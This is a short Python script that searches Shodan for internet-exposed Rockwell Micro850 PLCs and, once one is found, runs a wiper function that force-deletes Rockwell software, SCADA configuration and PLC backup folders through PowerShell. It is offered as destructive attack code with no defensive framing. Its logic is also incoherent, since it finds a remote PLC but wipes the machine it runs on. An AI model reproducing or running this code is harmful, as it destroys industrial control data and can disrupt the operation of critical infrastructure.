import os
import shodan
import socket
import subprocess

# SHODAN API Key (Need a valid API key)
SHODAN_API_KEY = "YOUR_SHODAN_API_KEY"

# Search query to find Rockwell Micro850 PLC
SEARCH_QUERY = "Micro850"

def find_plc_ip():
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        results = api.search(SEARCH_QUERY)
        
        for result in results['matches']:
            ip_address = result['ip_str']
            print(f"Found Micro850 PLC at IP: {ip_address}")
            return ip_address
          
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
        return None

# Function to wipe critical files using PowerShell
def destroy_data():
    try:
        print("Initiating destructive process on operator interface...")

        # Define critical directories and files (Example paths, modify as needed)
        critical_paths = [
            "C:\\Program Files\\Rockwell Software\\RSLogix 5000\\",
            "C:\\Users\\Public\\Documents\\SCADA_Configs\\",
            "C:\\Windows\\System32\\RockwellData\\",
            "D:\\Backups\\PLC_Configs\\"
        ]

        # Construct PowerShell deletion command
        for path in critical_paths:
            command = f'powershell.exe Remove-Item -Path "{path}" -Recurse -Force'
            subprocess.run(command, shell=True)

        print("Data destruction completed successfully.")
    
    except Exception as e:
        print(f"Error during destruction process: {e}")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        # Now that PLC IP is located, proceed with data destruction
        destroy_data()
    else:
        print("PLC IP not found. Cannot execute data destruction.")